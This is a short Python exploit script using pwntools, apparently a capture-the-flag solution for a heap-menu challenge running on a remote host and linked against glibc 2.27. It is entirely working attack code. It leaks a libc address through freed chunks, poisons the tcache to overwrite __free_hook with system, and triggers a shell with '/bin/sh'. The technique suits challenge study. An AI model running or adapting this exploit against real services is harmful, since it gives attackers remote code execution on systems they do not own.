
from pwn import*
context.log_level ='DEBUG'
def new(index):
	p.sendlineafter('choice:','1')
	p.sendlineafter('Index:',str(index))
def edit(index,content):
	p.sendlineafter('choice:','2')
	p.sendlineafter('Index:',str(index))
	p.sendafter('Content:',content)
def show(index):
	p.sendlineafter('choice:','3')
	p.sendlineafter('Index:',str(index))
def free(index):
	p.sendlineafter('choice:','4')
	p.sendlineafter('Index:',str(index))

p = process('./main')
p = remote('121.36.74.70',9999)
libc =ELF('./libc-2.27.so')
for i in range(7):
	new(i)
new(7)
new(8)
for i in range(8):
	free(i)
for i in range(7):
	new(i)
new(7)
show(7)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['__malloc_hook'] - 0x60 - 0x10
log.info('LIBC:\t' + hex(libc_base))
rce = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()
free_hook = libc_base + libc.sym['__free_hook']
free(7)

edit(7,p64(free_hook))
new(8)
new(9)
edit(9,p64(rce))
edit(0,'/bin/sh\x00')
free(0)
p.interactive()

